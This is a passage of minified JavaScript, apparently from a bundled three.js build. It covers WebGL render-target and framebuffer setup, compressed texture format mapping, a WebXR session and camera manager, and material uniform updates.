0&&($.__webglTexture=t.createTexture()),$.__version=x.version,a.memory.textures++),q){D.__webglFramebuffer=[];for(let le=0;le<6;le++)if(x.mipmaps&&x.mipmaps.length>0){D.__webglFramebuffer[le]=[];for(let we=0;we<x.mipmaps.length;we++)D.__webglFramebuffer[le][we]=t.createFramebuffer()}else D.__webglFramebuffer[le]=t.createFramebuffer()}else{if(x.mipmaps&&x.mipmaps.length>0){D.__webglFramebuffer=[];for(let le=0;le<x.mipmaps.length;le++)D.__webglFramebuffer[le]=t.createFramebuffer()}else D.__webglFramebuffer=t.createFramebuffer();if(Te)for(let le=0,we=ee.length;le<we;le++){const ke=i.get(ee[le]);ke.__webglTexture===void 0&&(ke.__webglTexture=t.createTexture(),a.memory.textures++)}if(R.samples>0&&Mt(R)===!1){D.__webglMultisampledFramebuffer=t.createFramebuffer(),D.__webglColorRenderbuffer=[],n.bindFramebuffer(t.FRAMEBUFFER,D.__webglMultisampledFramebuffer);for(let le=0;le<ee.length;le++){const we=ee[le];D.__webglColorRenderbuffer[le]=t.createRenderbuffer(),t.bindRenderbuffer(t.RENDERBUFFER,D.__webglColorRenderbuffer[le]);const ke=r.convert(we.format,we.colorSpace),re=r.convert(we.type),ue=_(we.internalFormat,ke,re,we.colorSpace,R.isXRRenderTarget===!0),Se=k(R);t.renderbufferStorageMultisample(t.RENDERBUFFER,Se,ue,R.width,R.height),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0+le,t.RENDERBUFFER,D.__webglColorRenderbuffer[le])}t.bindRenderbuffer(t.RENDERBUFFER,null),R.depthBuffer&&(D.__webglDepthRenderbuffer=t.createRenderbuffer(),De(D.__webglDepthRenderbuffer,R,!0)),n.bindFramebuffer(t.FRAMEBUFFER,null)}}if(q){n.bindTexture(t.TEXTURE_CUBE_MAP,$.__webglTexture),ye(t.TEXTURE_CUBE_MAP,x);for(let le=0;le<6;le++)if(x.mipmaps&&x.mipmaps.length>0)for(let we=0;we<x.mipmaps.length;we++)_e(D.__webglFramebuffer[le][we],R,x,t.COLOR_ATTACHMENT0,t.TEXTURE_CUBE_MAP_POSITIVE_X+le,we);else _e(D.__webglFramebuffer[le],R,x,t.COLOR_ATTACHMENT0,t.TEXTURE_CUBE_MAP_POSITIVE_X+le,0);m(x)&&u(t.TEXTURE_CUBE_MAP),n.unbindTexture()}else if(Te){for(let le=0,we=ee.length;le<we;le++){const ke=ee[le],re=i.get(ke);let ue=t.TEXTURE_2D;(R.isWebGL3DRenderTarget||R.isWebGLArrayRenderTarget)&&(ue=R.isWebGL3DRenderTarget?t.TEXTURE_3D:t.TEXTURE_2D_ARRAY),n.bindTexture(ue,re.__webglTexture),ye(ue,ke),_e(D.__webglFramebuffer,R,ke,t.COLOR_ATTACHMENT0+le,ue,0),m(ke)&&u(ue)}n.unbindTexture()}else{let le=t.TEXTURE_2D;if((R.isWebGL3DRenderTarget||R.isWebGLArrayRenderTarget)&&(le=R.isWebGL3DRenderTarget?t.TEXTURE_3D:t.TEXTURE_2D_ARRAY),n.bindTexture(le,$.__webglTexture),ye(le,x),x.mipmaps&&x.mipmaps.length>0)for(let we=0;we<x.mipmaps.length;we++)_e(D.__webglFramebuffer[we],R,x,t.COLOR_ATTACHMENT0,le,we);else _e(D.__webglFramebuffer,R,x,t.COLOR_ATTACHMENT0,le,0);m(x)&&u(le),n.unbindTexture()}R.depthBuffer&&qe(R)}function et(R){const x=R.textures;for(let D=0,$=x.length;D<$;D++){const ee=x[D];if(m(ee)){const q=g(R),Te=i.get(ee).__webglTexture;n.bindTexture(q,Te),u(q),n.unbindTexture()}}}const at=[],Fe=[];function Et(R){if(R.samples>0){if(Mt(R)===!1){const x=R.textures,D=R.width,$=R.height;let ee=t.COLOR_BUFFER_BIT;const q=R.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT,Te=i.get(R),le=x.length>1;if(le)for(let ke=0;ke<x.length;ke++)n.bindFramebuffer(t.FRAMEBUFFER,Te.__webglMultisampledFramebuffer),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0+ke,t.RENDERBUFFER,null),n.bindFramebuffer(t.FRAMEBUFFER,Te.__webglFramebuffer),t.framebufferTexture2D(t.DRAW_FRAMEBUFFER,t.COLOR_ATTACHMENT0+ke,t.TEXTURE_2D,null,0);n.bindFramebuffer(t.READ_FRAMEBUFFER,Te.__webglMultisampledFramebuffer);const we=R.texture.mipmaps;we&&we.length>0?n.bindFramebuffer(t.DRAW_FRAMEBUFFER,Te.__webglFramebuffer[0]):n.bindFramebuffer(t.DRAW_FRAMEBUFFER,Te.__webglFramebuffer);for(let ke=0;ke<x.length;ke++){if(R.resolveDepthBuffer&&(R.depthBuffer&&(ee|=t.DEPTH_BUFFER_BIT),R.stencilBuffer&&R.resolveStencilBuffer&&(ee|=t.STENCIL_BUFFER_BIT)),le){t.framebufferRenderbuffer(t.READ_FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.RENDERBUFFER,Te.__webglColorRenderbuffer[ke]);const re=i.get(x[ke]).__webglTexture;t.framebufferTexture2D(t.DRAW_FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,re,0)}t.blitFramebuffer(0,0,D,$,0,0,D,$,ee,t.NEAREST),l===!0&&(at.length=0,Fe.length=0,at.push(t.COLOR_ATTACHMENT0+ke),R.depthBuffer&&R.resolveDepthBuffer===!1&&(at.push(q),Fe.push(q),t.invalidateFramebuffer(t.DRAW_FRAMEBUFFER,Fe)),t.invalidateFramebuffer(t.READ_FRAMEBUFFER,at))}if(n.bindFramebuffer(t.READ_FRAMEBUFFER,null),n.bindFramebuffer(t.DRAW_FRAMEBUFFER,null),le)for(let ke=0;ke<x.length;ke++){n.bindFramebuffer(t.FRAMEBUFFER,Te.__webglMultisampledFramebuffer),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0+ke,t.RENDERBUFFER,Te.__webglColorRenderbuffer[ke]);const re=i.get(x[ke]).__webglTexture;n.bindFramebuffer(t.FRAMEBUFFER,Te.__webglFramebuffer),t.framebufferTexture2D(t.DRAW_FRAMEBUFFER,t.COLOR_ATTACHMENT0+ke,t.TEXTURE_2D,re,0)}n.bindFramebuffer(t.DRAW_FRAMEBUFFER,Te.__webglMultisampledFramebuffer)}else if(R.depthBuffer&&R.resolveDepthBuffer===!1&&l){const x=R.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT;t.invalidateFramebuffer(t.DRAW_FRAMEBUFFER,[x])}}}function k(R){return Math.min(s.maxSamples,R.samples)}function Mt(R){const x=i.get(R);return R.samples>0&&e.has("WEBGL_multisampled_render_to_texture")===!0&&x.__useRenderToTexture!==!1}function Je(R){const x=a.render.frame;p.get(R)!==x&&(p.set(R,x),R.update())}function lt(R,x){const D=R.colorSpace,$=R.format,ee=R.type;return R.isCompressedTexture===!0||R.isVideoTexture===!0||D!==Dr&&D!==Xi&&(We.getTransfer(D)===it?($!==jn||ee!==yn)&&Ie("WebGLTextures: sRGB encoded textures have to use RGBAFormat and UnsignedByteType."):$e("WebGLTextures: Unsupported texture color space:",D)),x}function Ee(R){return typeof HTMLImageElement<"u"&&R instanceof HTMLImageElement?(c.width=R.naturalWidth||R.width,c.height=R.naturalHeight||R.height):typeof VideoFrame<"u"&&R instanceof VideoFrame?(c.width=R.displayWidth,c.height=R.displayHeight):(c.width=R.width,c.height=R.height),c}this.allocateTextureUnit=V,this.resetTextureUnits=G,this.setTexture2D=O,this.setTexture2DArray=z,this.setTexture3D=F,this.setTextureCube=I,this.rebindTextures=Nt,this.setupRenderTarget=Ge,this.updateRenderTargetMipmap=et,this.updateMultisampleRenderTarget=Et,this.setupDepthRenderbuffer=qe,this.setupFrameBufferTexture=_e,this.useMultisampledRTT=Mt,this.isReversedDepthBuffer=function(){return n.buffers.depth.getReversed()}}function VA(t,e){function n(i,s=Xi){let r;const a=We.getTransfer(s);if(i===yn)return t.UNSIGNED_BYTE;if(i===th)return t.UNSIGNED_SHORT_4_4_4_4;if(i===nh)return t.UNSIGNED_SHORT_5_5_5_1;if(i===N0)return t.UNSIGNED_INT_5_9_9_9_REV;if(i===I0)return t.UNSIGNED_INT_10F_11F_11F_REV;if(i===k0)return t.BYTE;if(i===L0)return t.SHORT;if(i===Ha)return t.UNSIGNED_SHORT;if(i===eh)return t.INT;if(i===ci)return t.UNSIGNED_INT;if(i===ni)return t.FLOAT;if(i===ki)return t.HALF_FLOAT;if(i===D0)return t.ALPHA;if(i===U0)return t.RGB;if(i===jn)return t.RGBA;if(i===Li)return t.DEPTH_COMPONENT;if(i===Ps)return t.DEPTH_STENCIL;if(i===O0)return t.RED;if(i===ih)return t.RED_INTEGER;if(i===Ir)return t.RG;if(i===sh)return t.RG_INTEGER;if(i===rh)return t.RGBA_INTEGER;if(i===il||i===sl||i===rl||i===al)if(a===it)if(r=e.get("WEBGL_compressed_texture_s3tc_srgb"),r!==null){if(i===il)return r.COMPRESSED_SRGB_S3TC_DXT1_EXT;if(i===sl)return r.COMPRESSED_SRGB_ALPHA_S3TC_DXT1_EXT;if(i===rl)return r.COMPRESSED_SRGB_ALPHA_S3TC_DXT3_EXT;if(i===al)return r.COMPRESSED_SRGB_ALPHA_S3TC_DXT5_EXT}else return null;else if(r=e.get("WEBGL_compressed_texture_s3tc"),r!==null){if(i===il)return r.COMPRESSED_RGB_S3TC_DXT1_EXT;if(i===sl)return r.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(i===rl)return r.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(i===al)return r.COMPRESSED_RGBA_S3TC_DXT5_EXT}else return null;if(i===Sd||i===bd||i===wd||i===Ed)if(r=e.get("WEBGL_compressed_texture_pvrtc"),r!==null){if(i===Sd)return r.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(i===bd)return r.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(i===wd)return r.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(i===Ed)return r.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}else return null;if(i===Md||i===Td||i===Ad||i===Cd||i===Rd||i===Pd||i===kd)if(r=e.get("WEBGL_compressed_texture_etc"),r!==null){if(i===Md||i===Td)return a===it?r.COMPRESSED_SRGB8_ETC2:r.COMPRESSED_RGB8_ETC2;if(i===Ad)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ETC2_EAC:r.COMPRESSED_RGBA8_ETC2_EAC;if(i===Cd)return r.COMPRESSED_R11_EAC;if(i===Rd)return r.COMPRESSED_SIGNED_R11_EAC;if(i===Pd)return r.COMPRESSED_RG11_EAC;if(i===kd)return r.COMPRESSED_SIGNED_RG11_EAC}else return null;if(i===Ld||i===Nd||i===Id||i===Dd||i===Ud||i===Od||i===Fd||i===Bd||i===zd||i===Vd||i===Hd||i===Gd||i===Wd||i===jd)if(r=e.get("WEBGL_compressed_texture_astc"),r!==null){if(i===Ld)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_4x4_KHR:r.COMPRESSED_RGBA_ASTC_4x4_KHR;if(i===Nd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_5x4_KHR:r.COMPRESSED_RGBA_ASTC_5x4_KHR;if(i===Id)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_5x5_KHR:r.COMPRESSED_RGBA_ASTC_5x5_KHR;if(i===Dd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_6x5_KHR:r.COMPRESSED_RGBA_ASTC_6x5_KHR;if(i===Ud)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_6x6_KHR:r.COMPRESSED_RGBA_ASTC_6x6_KHR;if(i===Od)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_8x5_KHR:r.COMPRESSED_RGBA_ASTC_8x5_KHR;if(i===Fd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_8x6_KHR:r.COMPRESSED_RGBA_ASTC_8x6_KHR;if(i===Bd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_8x8_KHR:r.COMPRESSED_RGBA_ASTC_8x8_KHR;if(i===zd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_10x5_KHR:r.COMPRESSED_RGBA_ASTC_10x5_KHR;if(i===Vd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_10x6_KHR:r.COMPRESSED_RGBA_ASTC_10x6_KHR;if(i===Hd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_10x8_KHR:r.COMPRESSED_RGBA_ASTC_10x8_KHR;if(i===Gd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_10x10_KHR:r.COMPRESSED_RGBA_ASTC_10x10_KHR;if(i===Wd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_12x10_KHR:r.COMPRESSED_RGBA_ASTC_12x10_KHR;if(i===jd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_12x12_KHR:r.COMPRESSED_RGBA_ASTC_12x12_KHR}else return null;if(i===Xd||i===qd||i===Yd)if(r=e.get("EXT_texture_compression_bptc"),r!==null){if(i===Xd)return a===it?r.COMPRESSED_SRGB_ALPHA_BPTC_UNORM_EXT:r.COMPRESSED_RGBA_BPTC_UNORM_EXT;if(i===qd)return r.COMPRESSED_RGB_BPTC_SIGNED_FLOAT_EXT;if(i===Yd)return r.COMPRESSED_RGB_BPTC_UNSIGNED_FLOAT_EXT}else return null;if(i===$d||i===Kd||i===Zd||i===Jd)if(r=e.get("EXT_texture_compression_rgtc"),r!==null){if(i===$d)return r.COMPRESSED_RED_RGTC1_EXT;if(i===Kd)return r.COMPRESSED_SIGNED_RED_RGTC1_EXT;if(i===Zd)return r.COMPRESSED_RED_GREEN_RGTC2_EXT;if(i===Jd)return r.COMPRESSED_SIGNED_RED_GREEN_RGTC2_EXT}else return null;return i===Ga?t.UNSIGNED_INT_24_8:t[i]!==void 0?t[i]:null}return{convert:n}}const HA=`
void main() {

	gl_Position = vec4( position, 1.0 );

}`,GA=`
uniform sampler2DArray depthColor;
uniform float depthWidth;
uniform float depthHeight;

void main() {

	vec2 coord = vec2( gl_FragCoord.x / depthWidth, gl_FragCoord.y / depthHeight );

	if ( coord.x >= 1.0 ) {

		gl_FragDepth = texture( depthColor, vec3( coord.x - 1.0, coord.y, 1 ) ).r;

	} else {

		gl_FragDepth = texture( depthColor, vec3( coord.x, coord.y, 0 ) ).r;

	}

}`;class WA{constructor(){this.texture=null,this.mesh=null,this.depthNear=0,this.depthFar=0}init(e,n){if(this.texture===null){const i=new $0(e.texture);(e.depthNear!==n.depthNear||e.depthFar!==n.depthFar)&&(this.depthNear=e.depthNear,this.depthFar=e.depthFar),this.texture=i}}getMesh(e){if(this.texture!==null&&this.mesh===null){const n=e.cameras[0].viewport,i=new di({vertexShader:HA,fragmentShader:GA,uniforms:{depthColor:{value:this.texture},depthWidth:{value:n.z},depthHeight:{value:n.w}}});this.mesh=new Nn(new tc(20,20),i)}return this.mesh}reset(){this.texture=null,this.mesh=null}getDepthTexture(){return this.texture}}class jA extends Vr{constructor(e,n){super();const i=this;let s=null,r=1,a=null,o="local-floor",l=1,c=null,p=null,d=null,h=null,f=null,v=null;const y=typeof XRWebGLBinding<"u",m=new WA,u={},g=n.getContextAttributes();let _=null,b=null;const T=[],A=[],C=new Ze;let L=null;const w=new xn;w.viewport=new St;const E=new xn;E.viewport=new St;const P=[w,E],G=new eE;let V=null,Z=null;this.cameraAutoUpdate=!0,this.enabled=!1,this.isPresenting=!1,this.getController=function(Y){let te=T[Y];return te===void 0&&(te=new su,T[Y]=te),te.getTargetRaySpace()},this.getControllerGrip=function(Y){let te=T[Y];return te===void 0&&(te=new su,T[Y]=te),te.getGripSpace()},this.getHand=function(Y){let te=T[Y];return te===void 0&&(te=new su,T[Y]=te),te.getHandSpace()};function O(Y){const te=A.indexOf(Y.inputSource);if(te===-1)return;const _e=T[te];_e!==void 0&&(_e.update(Y.inputSource,Y.frame,c||a),_e.dispatchEvent({type:Y.type,data:Y.inputSource}))}function z(){s.removeEventListener("select",O),s.removeEventListener("selectstart",O),s.removeEventListener("selectend",O),s.removeEventListener("squeeze",O),s.removeEventListener("squeezestart",O),s.removeEventListener("squeezeend",O),s.removeEventListener("end",z),s.removeEventListener("inputsourceschange",F);for(let Y=0;Y<T.length;Y++){const te=A[Y];te!==null&&(A[Y]=null,T[Y].disconnect(te))}V=null,Z=null,m.reset();for(const Y in u)delete u[Y];e.setRenderTarget(_),f=null,h=null,d=null,s=null,b=null,Qe.stop(),i.isPresenting=!1,e.setPixelRatio(L),e.setSize(C.width,C.height,!1),i.dispatchEvent({type:"sessionend"})}this.setFramebufferScaleFactor=function(Y){r=Y,i.isPresenting===!0&&Ie("WebXRManager: Cannot change framebuffer scale while presenting.")},this.setReferenceSpaceType=function(Y){o=Y,i.isPresenting===!0&&Ie("WebXRManager: Cannot change reference space type while presenting.")},this.getReferenceSpace=function(){return c||a},this.setReferenceSpace=function(Y){c=Y},this.getBaseLayer=function(){return h!==null?h:f},this.getBinding=function(){return d===null&&y&&(d=new XRWebGLBinding(s,n)),d},this.getFrame=function(){return v},this.getSession=function(){return s},this.setSession=async function(Y){if(s=Y,s!==null){if(_=e.getRenderTarget(),s.addEventListener("select",O),s.addEventListener("selectstart",O),s.addEventListener("selectend",O),s.addEventListener("squeeze",O),s.addEventListener("squeezestart",O),s.addEventListener("squeezeend",O),s.addEventListener("end",z),s.addEventListener("inputsourceschange",F),g.xrCompatible!==!0&&await n.makeXRCompatible(),L=e.getPixelRatio(),e.getSize(C),y&&"createProjectionLayer"in XRWebGLBinding.prototype){let _e=null,De=null,be=null;g.depth&&(be=g.stencil?n.DEPTH24_STENCIL8:n.DEPTH_COMPONENT24,_e=g.stencil?Ps:Li,De=g.stencil?Ga:ci);const qe={colorFormat:n.RGBA8,depthFormat:be,scaleFactor:r};d=this.getBinding(),h=d.createProjectionLayer(qe),s.updateRenderState({layers:[h]}),e.setPixelRatio(1),e.setSize(h.textureWidth,h.textureHeight,!1),b=new oi(h.textureWidth,h.textureHeight,{format:jn,type:yn,depthTexture:new ja(h.textureWidth,h.textureHeight,De,void 0,void 0,void 0,void 0,void 0,void 0,_e),stencilBuffer:g.stencil,colorSpace:e.outputColorSpace,samples:g.antialias?4:0,resolveDepthBuffer:h.ignoreDepthValues===!1,resolveStencilBuffer:h.ignoreDepthValues===!1})}else{const _e={antialias:g.antialias,alpha:!0,depth:g.depth,stencil:g.stencil,framebufferScaleFactor:r};f=new XRWebGLLayer(s,n,_e),s.updateRenderState({baseLayer:f}),e.setPixelRatio(1),e.setSize(f.framebufferWidth,f.framebufferHeight,!1),b=new oi(f.framebufferWidth,f.framebufferHeight,{format:jn,type:yn,colorSpace:e.outputColorSpace,stencilBuffer:g.stencil,resolveDepthBuffer:f.ignoreDepthValues===!1,resolveStencilBuffer:f.ignoreDepthValues===!1})}b.isXRRenderTarget=!0,this.setFoveation(l),c=null,a=await s.requestReferenceSpace(o),Qe.setContext(s),Qe.start(),i.isPresenting=!0,i.dispatchEvent({type:"sessionstart"})}},this.getEnvironmentBlendMode=function(){if(s!==null)return s.environmentBlendMode},this.getDepthTexture=function(){return m.getDepthTexture()};function F(Y){for(let te=0;te<Y.removed.length;te++){const _e=Y.removed[te],De=A.indexOf(_e);De>=0&&(A[De]=null,T[De].disconnect(_e))}for(let te=0;te<Y.added.length;te++){const _e=Y.added[te];let De=A.indexOf(_e);if(De===-1){for(let qe=0;qe<T.length;qe++)if(qe>=A.length){A.push(_e),De=qe;break}else if(A[qe]===null){A[qe]=_e,De=qe;break}if(De===-1)break}const be=T[De];be&&be.connect(_e)}}const I=new H,X=new H;function K(Y,te,_e){I.setFromMatrixPosition(te.matrixWorld),X.setFromMatrixPosition(_e.matrixWorld);const De=I.distanceTo(X),be=te.projectionMatrix.elements,qe=_e.projectionMatrix.elements,Nt=be[14]/(be[10]-1),Ge=be[14]/(be[10]+1),et=(be[9]+1)/be[5],at=(be[9]-1)/be[5],Fe=(be[8]-1)/be[0],Et=(qe[8]+1)/qe[0],k=Nt*Fe,Mt=Nt*Et,Je=De/(-Fe+Et),lt=Je*-Fe;if(te.matrixWorld.decompose(Y.position,Y.quaternion,Y.scale),Y.translateX(lt),Y.translateZ(Je),Y.matrixWorld.compose(Y.position,Y.quaternion,Y.scale),Y.matrixWorldInverse.copy(Y.matrixWorld).invert(),be[10]===-1)Y.projectionMatrix.copy(te.projectionMatrix),Y.projectionMatrixInverse.copy(te.projectionMatrixInverse);else{const Ee=Nt+Je,R=Ge+Je,x=k-lt,D=Mt+(De-lt),$=et*Ge/R*Ee,ee=at*Ge/R*Ee;Y.projectionMatrix.makePerspective(x,D,$,ee,Ee,R),Y.projectionMatrixInverse.copy(Y.projectionMatrix).invert()}}function ne(Y,te){te===null?Y.matrixWorld.copy(Y.matrix):Y.matrixWorld.multiplyMatrices(te.matrixWorld,Y.matrix),Y.matrixWorldInverse.copy(Y.matrixWorld).invert()}this.updateCamera=function(Y){if(s===null)return;let te=Y.near,_e=Y.far;m.texture!==null&&(m.depthNear>0&&(te=m.depthNear),m.depthFar>0&&(_e=m.depthFar)),G.near=E.near=w.near=te,G.far=E.far=w.far=_e,(V!==G.near||Z!==G.far)&&(s.updateRenderState({depthNear:G.near,depthFar:G.far}),V=G.near,Z=G.far),G.layers.mask=Y.layers.mask|6,w.layers.mask=G.layers.mask&3,E.layers.mask=G.layers.mask&5;const De=Y.parent,be=G.cameras;ne(G,De);for(let qe=0;qe<be.length;qe++)ne(be[qe],De);be.length===2?K(G,w,E):G.projectionMatrix.copy(w.projectionMatrix),ye(Y,G,De)};function ye(Y,te,_e){_e===null?Y.matrix.copy(te.matrixWorld):(Y.matrix.copy(_e.matrixWorld),Y.matrix.invert(),Y.matrix.multiply(te.matrixWorld)),Y.matrix.decompose(Y.position,Y.quaternion,Y.scale),Y.updateMatrixWorld(!0),Y.projectionMatrix.copy(te.projectionMatrix),Y.projectionMatrixInverse.copy(te.projectionMatrixInverse),Y.isPerspectiveCamera&&(Y.fov=Qd*2*Math.atan(1/Y.projectionMatrix.elements[5]),Y.zoom=1)}this.getCamera=function(){return G},this.getFoveation=function(){if(!(h===null&&f===null))return l},this.setFoveation=function(Y){l=Y,h!==null&&(h.fixedFoveation=Y),f!==null&&f.fixedFoveation!==void 0&&(f.fixedFoveation=Y)},this.hasDepthSensing=function(){return m.texture!==null},this.getDepthSensingMesh=function(){return m.getMesh(G)},this.getCameraTexture=function(Y){return u[Y]};let Le=null;function Ke(Y,te){if(p=te.getViewerPose(c||a),v=te,p!==null){const _e=p.views;f!==null&&(e.setRenderTargetFramebuffer(b,f.framebuffer),e.setRenderTarget(b));let De=!1;_e.length!==G.cameras.length&&(G.cameras.length=0,De=!0);for(let Ge=0;Ge<_e.length;Ge++){const et=_e[Ge];let at=null;if(f!==null)at=f.getViewport(et);else{const Et=d.getViewSubImage(h,et);at=Et.viewport,Ge===0&&(e.setRenderTargetTextures(b,Et.colorTexture,Et.depthStencilTexture),e.setRenderTarget(b))}let Fe=P[Ge];Fe===void 0&&(Fe=new xn,Fe.layers.enable(Ge),Fe.viewport=new St,P[Ge]=Fe),Fe.matrix.fromArray(et.transform.matrix),Fe.matrix.decompose(Fe.position,Fe.quaternion,Fe.scale),Fe.projectionMatrix.fromArray(et.projectionMatrix),Fe.projectionMatrixInverse.copy(Fe.projectionMatrix).invert(),Fe.viewport.set(at.x,at.y,at.width,at.height),Ge===0&&(G.matrix.copy(Fe.matrix),G.matrix.decompose(G.position,G.quaternion,G.scale)),De===!0&&G.cameras.push(Fe)}const be=s.enabledFeatures;if(be&&be.includes("depth-sensing")&&s.depthUsage=="gpu-optimized"&&y){d=i.getBinding();const Ge=d.getDepthInformation(_e[0]);Ge&&Ge.isValid&&Ge.texture&&m.init(Ge,s.renderState)}if(be&&be.includes("camera-access")&&y){e.state.unbindTexture(),d=i.getBinding();for(let Ge=0;Ge<_e.length;Ge++){const et=_e[Ge].camera;if(et){let at=u[et];at||(at=new $0,u[et]=at);const Fe=d.getCameraImage(et);at.sourceTexture=Fe}}}}for(let _e=0;_e<T.length;_e++){const De=A[_e],be=T[_e];De!==null&&be!==void 0&&be.update(De,te,c||a)}Le&&Le(Y,te),te.detectedPlanes&&i.dispatchEvent({type:"planesdetected",data:te}),v=null}const Qe=new Z0;Qe.setAnimationLoop(Ke),this.setAnimationLoop=function(Y){Le=Y},this.dispose=function(){}}}const ys=new ui,XA=new bt;function qA(t,e){function n(m,u){m.matrixAutoUpdate===!0&&m.updateMatrix(),u.value.copy(m.matrix)}function i(m,u){u.color.getRGB(m.fogColor.value,j0(t)),u.isFog?(m.fogNear.value=u.near,m.fogFar.value=u.far):u.isFogExp2&&(m.fogDensity.value=u.density)}function s(m,u,g,_,b){u.isMeshBasicMaterial||u.isMeshLambertMaterial?r(m,u):u.isMeshToonMaterial?(r(m,u),d(m,u)):u.isMeshPhongMaterial?(r(m,u),p(m,u)):u.isMeshStandardMaterial?(r(m,u),h(m,u),u.isMeshPhysicalMaterial&&f(m,u,b)):u.isMeshMatcapMaterial?(r(m,u),v(m,u)):u.isMeshDepthMaterial?r(m,u):u.isMeshDistanceMaterial?(r(m,u),y(m,u)):u.isMeshNormalMaterial?r(m,u):u.isLineBasicMaterial?(a(m,u),u.isLineDashedMaterial&&o(m,u)):u.isPointsMaterial?l(m,u,g,_):u.isSpriteMaterial?c(m,u):u.isShadowMaterial?(m.color.value.copy(u.color),m.opacity.value=u.opacity):u.isShaderMaterial&&(u.uniformsNeedUpdate=!1)}function r(m,u){m.opacity.value=u.opacity,u.color&&m.diffuse.value.copy(u.color),u.emissive&&m.emissive.value.copy(u.emissive).multiplyScalar(u.emissiveIntensity),u.map&&(m.map.value=u.map,n(u.map,m.mapTransform)),u.alphaMap&&(m.alphaMap.value=u.alphaMap,n(u.alphaMap,m.alphaMapTransform)),u.bumpMap&&(m.bumpMap.value=u.bumpMap,n(u.bumpMap,m.bumpMapTransform),m.bumpScale.value=u.bumpScale,u.side===hn&&(m.bumpScale.value*=-1)),u.normalMap&&(m.normalMap.value=u.normalMap,n(u.normalMap,m.normalMapTransform),m.normalScale.value.copy(u.normalScale),u.side===hn&&m.normalScale.value.negate()),u.displacementMap&&(m.displacementMap.value=u.displacementMap,n(u.displacementMap,m.displacementMapTransform),m.displacementScale.value=u.displacementScale,m.displacementBias.value=u.displacementBias),u.emissiveMap&&(m.emissiveMap.value=u.emissiveMap,n(u.emissiveMap,m.emissiveMapTransform)),u.specularMap&&(m.specularMap.value=u.specularMap,n(u.specularMap,m.specularMapTransform)),u.alphaTest>0&&(m.alphaTest.value=u.alphaTest);const g=e.get(u),_=g.envMap,b=g.envMapRotation;_&&(m.envMap.value=_,ys.copy(b),ys.x*=-1,ys.y*=-1,ys.z*=-1,_.isCubeTexture&&_.isRenderTargetTexture===!1&&(ys.y*=-1,ys.z*=-1),m.envMapRotation.value.setFromMatrix4(XA.makeRotationFromEuler(ys)),m.flipEnvMap.value=_.isCubeTexture&&_.isRenderTargetTexture===!1?-1:1,m.reflectivity.value=u.reflectivity,m.ior.value=u.ior,m.refractionRatio.value=u.refractionRatio),u.lightMap&&(m.lightMap.value=u.lightMap,m.lightMapIntensity.value=u.lightMapIntensity,n(u.lightMap,m.lightMapTransform)),u.aoMap&&(m.aoMap.value=u.aoMap,m.aoMapIntensity.value=u.aoMapIntensity,n(u.aoMap,m.aoMapTransform))}function a(m,u){m.diffuse.value.copy(u.color),m.opacity.value=u.opacity,u.map&&(m.map.value=u.map,n(u.map,m.mapTransform))}function o(m,u){m.dashSize.value=u.dashSize,m.totalSize.value=u.dashSize+u.gapSize,m.scale.value=u.scale}function l(m,u,g,_){m.diffuse.value.copy(u.color),m.opacity.value=u.opacity,m.size.value=u.size*g,m.scale.value=_*.5,u.map&&(m.map.value=u.map,n(u.map,m.uvTransform)),u.alphaMap&&(m.alphaMap.value=u.alphaMap,n(u.alphaMap,m.alphaMapTransform)),u.alphaTest>0&&(m.alphaTest.value=u.alphaTest)}function c(m,u){m.diffuse.value.copy(u.color),m.opacity.value=u.opacity,m.rotation.value=u.rotation,u.map&&(m.map.value=u.map,n(u.map,m.mapTransform)),u.alphaMap&&(m.alphaMap.value=u.alphaMap,n(u.alphaMap,m.alphaMapTransform)),u.alphaTest>0&&(m.alphaTest.value=u.alphaTest)}function p(m,u){m.specular.value.copy(u.specular),m.shininess.value=Math.max(u.shininess,1e-4)}function d(m,u){u.gradientMap&&(m.gradientMap.value=u.gradientMap)}function h(m,u){m.metalness.value=u.metalness,u.metalnessMap&&(m.metalnessMap.value=u.metalnessMap,n(u.metalnessMap,m.metalnessMapTransform)),m.roughness.value=u.roughness,u.roughnessMap&&(m.roughnessMap.value=u.roughnessMap,n(u.roughnessMap,m.roughnessMapTransform)),u.envMap&&(m.envMapIntensity.value=u.envMapIntensity)}function 